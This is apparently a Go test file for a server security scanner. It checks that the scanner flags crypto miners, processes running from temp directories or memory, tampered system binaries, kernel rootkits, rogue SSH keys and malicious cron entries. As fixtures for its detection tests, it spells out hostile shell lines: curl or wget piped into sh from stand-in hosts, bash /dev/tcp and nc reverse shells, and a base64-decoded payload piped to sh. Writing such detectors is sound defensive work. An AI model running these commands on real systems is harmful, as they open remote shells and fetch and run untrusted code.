package scan

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/mimic890/server-init/internal/check"
	"github.com/mimic890/server-init/internal/systest"
)

func status(t *testing.T, r check.Report, title string, want check.Status) check.Finding {
	t.Helper()
	for _, f := range r.Findings {
		if f.Title == title {
			if f.Status != want {
				t.Fatalf("%s: status %v, want %v\n%s", title, f.Status, want, r.String())
			}
			return f
		}
	}
	t.Fatalf("no finding %q in:\n%s", title, r.String())
	return check.Finding{}
}

func TestProcessChecks(t *testing.T) {
	ps := ParsePS(`    1 root      0.0 99999 systemd /sbin/init
    2 root      0.0 99999 kthreadd [kthreadd]
  100 www-data 395.0  7200 kdevtmpfsi /tmp/kdevtmpfsi
  101 nobody    1.0  7200 python3 python3 -c x --url stratum+tcp://pool.example:3333
  102 root      0.0  7200 sshd sshd: /usr/sbin/sshd -D
  103 root      0.0  7200 runc runc init
  104 root      0.0  7200 bash bash
  105 root     90.0  7200 ffmpeg ffmpeg -i a.mp4 b.webm
`)
	exe := ParseExeLinks("/proc/1/exe\t/usr/lib/systemd/systemd\n/proc/100/exe\t/tmp/kdevtmpfsi (deleted)\n" +
		"/proc/102/exe\t/usr/sbin/sshd (deleted)\n/proc/103/exe\t/memfd:runc_cloned:/proc/self/exe (deleted)\n" +
		"/proc/104/exe\t/memfd: (deleted)\n")
	for i := range ps {
		e := exe[ps[i].PID]
		if strings.HasSuffix(e, " (deleted)") {
			e = strings.TrimSuffix(e, " (deleted)")
			ps[i].Memfd = strings.HasPrefix(e, "/memfd:")
			ps[i].Gone = !ps[i].Memfd
		}
		ps[i].Exe = e
	}
	var r check.Report
	ProcessChecks(&r, ps, func(p string) bool { return p == "/usr/sbin/sshd" })
	if f := status(t, r, "Known miners and bots", check.Fail); len(f.Details) != 2 {
		t.Fatalf("miners by name and by arguments: %v", f.Details)
	}
	if f := status(t, r, "Programs running from temp directories", check.Fail); !strings.Contains(f.Details[0], "pid 100") {
		t.Fatal(f.Details)
	}
	if f := status(t, r, "Programs running from memory", check.Fail); len(f.Details) != 1 || !strings.Contains(f.Details[0], "pid 104") {
		t.Fatalf("runc must be ignored: %v", f.Details)
	}
	if f := status(t, r, "Outdated programs still running", check.Info); !strings.Contains(f.Details[0], "pid 102") {
		t.Fatal(f.Details)
	}
	if f := status(t, r, "High CPU load", check.Warn); len(f.Details) != 2 {
		t.Fatal(f.Details)
	}
}

func TestSuspicious(t *testing.T) {
	for line, bad := range map[string]bool{
		"*/5 * * * * root curl -fsSL http://x.example/a.sh | sh":                         true,
		"@reboot wget -q -O- http://1.2.3.4/x|bash":                                      true,
		"* * * * * /tmp/.x/kworker":                                                      true,
		"* * * * * root /dev/shm/.k >/dev/null 2>&1":                                     true,
		"ExecStart=/var/tmp/.cache/run":                                                  true,
		"bash -i >& /dev/tcp/203.0.113.9/4444 0>&1":                                      true,
		"nc 203.0.113.9 4444 -e /bin/sh":                                                 true,
		"echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IHN0cmluZw== | base64 -d | sh": true,
		"# curl http://x | sh":                                                           false,
		"17 * * * * root cd / && run-parts --report /etc/cron.hourly":                    false,
		"PrivateTmp=true":                                                                false,
		"find /tmp -type f -atime +10 -delete":                                           false,
		"ExecStart=/usr/bin/curl -fsS https://example.com/health":                        false,
	} {
		if got := Suspicious(line) != ""; got != bad {
			t.Errorf("Suspicious(%q) = %v, want %v", line, got, bad)
		}
	}
}

func TestParseDpkgVerify(t *testing.T) {
	system, other := ParseDpkgVerify(`??5??????   /usr/bin/ls
??5?????? c /etc/ssh/sshd_config
missing     /usr/share/doc/foo/README
??5??????   /usr/share/foo/data.txt
.......T.   /usr/bin/cat
`)
	if strings.Join(system, " ") != "/usr/bin/ls" || strings.Join(other, " ") != "/usr/share/foo/data.txt" {
		t.Fatal(system, other)
	}
}

func TestParseClamscan(t *testing.T) {
	f := ParseClamscan("/tmp/x: Unix.Trojan.Mirai-123 FOUND\n/home/a/ok.txt: OK\n")
	if len(f) != 1 || !strings.HasPrefix(f[0], "/tmp/x:") {
		t.Fatal(f)
	}
	if AvailableMB("MemTotal: 2000000 kB\nMemAvailable: 512000 kB\nSwapFree: 1024000 kB\n") != 1500 {
		t.Fatal("AvailableMB")
	}
}

func TestRunOnFakeHost(t *testing.T) {
	h := systest.New(t)
	h.Tools["dpkg"] = true
	h.On("ps -eo", "  100 root 0.0 100 bash bash\n")
	h.On("ss -H -tnp state established", "0 0 10.0.0.5:51000 198.51.100.7:3333 users:((\"x\",pid=9,fd=3))\n")
	h.On("dpkg --verify", "ERR:??5??????   /usr/sbin/sshd\n??5??????   /usr/bin/man\n")
	h.On("dpkg-divert --list", "diversion of /usr/bin/man to /usr/bin/man.REAL by ubuntu-minimal\n")
	h.Write("/etc/cron.d/backup", "0 3 * * * root /usr/local/bin/backup\n")
	h.Write("/var/spool/cron/crontabs/www-data", "* * * * * curl -s http://203.0.113.9/x.sh | bash\n")
	h.Write("/etc/ld.so.preload", "/usr/lib/libprocesshider.so\n")
	h.Write("/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3Nza me@laptop\n")
	h.Write("/home/admin/.ssh/authorized_keys2", "ssh-rsa AAAAB3Nza x@evil\n")
	h.Write("/proc/modules", "diamorphine 16384 0 - Live 0x0000000000000000 (OE)\next4 1 0\n")

	var steps []string
	r := Run(context.Background(), h, Options{Progress: func(s string) { steps = append(steps, s) }})
	if len(steps) < 5 {
		t.Fatal("progress not reported:", steps)
	}
	status(t, r, "Connections to mining pool ports", check.Warn)
	if f := status(t, r, "Cron jobs", check.Fail); len(f.Details) != 1 || !strings.Contains(f.Details[0], "www-data") {
		t.Fatal(f.Details)
	}
	status(t, r, "/etc/ld.so.preload", check.Fail)
	status(t, r, "Kernel rootkits", check.Fail)
	status(t, r, "SSH keys", check.Fail)
	if f := status(t, r, "Changed system programs", check.Fail); strings.Join(f.Details, " ") != "/usr/sbin/sshd" {
		t.Fatal(f.Details)
	}
	if h.Ran("apt-get") {
		t.Fatal("the built-in scan must not install anything")
	}
}

func TestClamAVInstallsAndScans(t *testing.T) {
	sigPoll, sigTimeout = time.Millisecond, time.Second
	h := systest.New(t)
	h.Write("/proc/meminfo", "MemAvailable: 4000000 kB\n")
	h.Write("/tmp/x", "")
	h.Hook = func(line string) (string, error, bool) {
		if strings.HasPrefix(line, "apt-get install") {
			h.Tools["clamscan"] = true
			return "", nil, true
		}
		if strings.HasPrefix(line, "freshclam") {
			h.Write("/var/lib/clamav/main.cvd", "x")
			h.Write("/var/lib/clamav/daily.cld", "x")
			return "", nil, true
		}
		return "", nil, false
	}
	h.Fail("systemctl is-active")
	h.On("clamscan --recursive", "ERR:/tmp/x: Eicar-Test-Signature FOUND\n")
	h.On("clamscan --version", "ClamAV 1.4.3/27800\n")
	var r check.Report
	hh := &host{ctx: context.Background(), s: h, r: &r}
	hh.clamav()
	if f := status(t, r, "ClamAV scan", check.Fail); f.Details[0] != "/tmp/x: Eicar-Test-Signature FOUND" {
		t.Fatal(f.Details)
	}
	if !h.Ran("apt-get install --no-install-recommends -y -q -o Dpkg::Options::=--force-confdef -o Dpkg::Options::=--force-confold clamav clamav-freshclam") {
		t.Fatal("clamav not installed:", h.Cmds)
	}
}

func TestClamAVNeedsMemory(t *testing.T) {
	h := systest.New(t)
	h.Write("/proc/meminfo", "MemAvailable: 300000 kB\nSwapFree: 0 kB\n")
	var r check.Report
	(&host{ctx: context.Background(), s: h, r: &r}).clamav()
	status(t, r, "ClamAV scan", check.Skip)
	if h.Ran("apt-get") {
		t.Fatal("must not install on a small server")
	}
}
